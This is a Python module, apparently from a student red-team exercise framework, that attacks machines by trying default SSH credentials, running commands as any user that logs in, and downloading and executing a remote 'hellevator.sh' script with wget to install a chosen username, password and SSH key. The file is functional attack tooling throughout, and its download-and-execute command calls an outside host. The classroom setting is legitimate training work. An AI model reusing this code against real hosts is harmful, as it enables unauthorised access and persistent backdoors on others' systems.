import paramiko
from Exploit import Exploit, PatchedException
import BetterLogger
from BetterLogger import logger


class ExploitDefaultCredentials(Exploit):
    def __init__(self, ip_address, parsed_config) -> None:
        super().__init__(ip_address=ip_address, parsed_config=parsed_config)

    def connect_over_ssh(self, username, password) -> paramiko.SSHClient:
        logger.debug(f"{self.ip_address} - Logging in as `{username}` over SSH...")
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(
            self.ip_address,
            username=username,
            password=password,
            look_for_keys=False,
            timeout=3,
        )  # disable using SSH keys, if an attacker set up SSH keys that doesn't count as being vulnerable to the default credentials
        logger.debug(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - Successfully logged in as `{username}`.{BetterLogger.COLOR_END}")
        return ssh_client

    def run_command(self, command):
        """
        Runs the specified command as the first available user and returns the response
        """
        logger.info(f"{self.ip_address} - Checking if default credentials are being used...")
        credentials = self.parsed_config["credentials"]
        for credential in credentials:
            username = credential["username"]
            password = credential["password"]
            try:
                ssh_client = self.connect_over_ssh(username=username, password=password)
                # logger.debug(f"{self.ip_address} - Running the command `{command}` over SSH as the user `{username}`...")
                ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(command)
                ssh_stdout_text = ssh_stdout.read().decode().strip()
                # logger.debug(f"{self.ip_address} - Received `{ssh_stdout_text}`.")
                ssh_client.close()
                return ssh_stdout_text
            except paramiko.AuthenticationException:
                logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - Failed to log in as `{username}` because the student changed their password!{BetterLogger.COLOR_END}")
                continue
            except Exception:
                logger.critical(f"{BetterLogger.COLOR_RED}{self.ip_address} - Failed to connect to the machine over SSH, something unexpected happened!{BetterLogger.COLOR_END}")
                continue
        raise PatchedException()

    def run_hellevator(self):
        try:
            logger.info(f"{self.ip_address} - Running Hellevator via ExploitDefaultCredentials...")

            username = self.parsed_config["ssh_username"]
            password = self.parsed_config["ssh_password"]
            ssh_key = self.parsed_config["ssh_public_key"]
            download_hellevator_command = f"wget -O hellevator.sh https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/hellevator.sh && chmod +x hellevator.sh && ./hellevator.sh -u '{username}' -p '{password}' -s '{ssh_key}'"

            server_response = self.run_command(command=download_hellevator_command)
            if ssh_key in server_response:
                logger.info(f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via ExploitDefaultCredentials!{BetterLogger.COLOR_END}")
                return True
        except paramiko.ssh_exception.NoValidConnectionsError:
            logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Failed to connect to the machine over SSH, the student disabled SSH!{BetterLogger.COLOR_END}")
            return None
        except PatchedException:
            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - Failed to log in as any of the users. The student changed all of their passwords!{BetterLogger.COLOR_END}")
            return False
        except Exception as err:
            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ExploitDefaultCredentials.{BetterLogger.COLOR_END}")
            logger.exception(err)
            return False

    def test_if_vulnerable(self):
        """
        Returns True if any default credentials can be used to connect and returns False otherwise
        """
        logger.info(f"{self.ip_address} - Checking if default credentials are being used...")
        credentials = self.parsed_config["credentials"]
        successfully_connected_users = []
        for credential in credentials:
            username = credential["username"]
            password = credential["password"]
            try:
                ssh_client = self.connect_over_ssh(username=username, password=password)
                ssh_client.close()
                successfully_connected_users.append(username)
            except paramiko.AuthenticationException:
                logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - Failed to log in as `{username}` because the student changed their password!{BetterLogger.COLOR_END}")
                continue
            except paramiko.ssh_exception.NoValidConnectionsError:
                logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Failed to connect to the machine over SSH, the student disabled SSH!{BetterLogger.COLOR_END}")
                return None
            except Exception:
                logger.critical(f"{BetterLogger.COLOR_RED}{self.ip_address} - Failed to connect to the machine over SSH, something unexpected happened!{BetterLogger.COLOR_END}")
                continue

        if len(successfully_connected_users) == 0:
            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - Failed to log in as any of the users. The student changed all of their passwords!{BetterLogger.COLOR_END}")
            return False
        logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - Successfully connected with the following users: {successfully_connected_users}{BetterLogger.COLOR_END}")
        return True
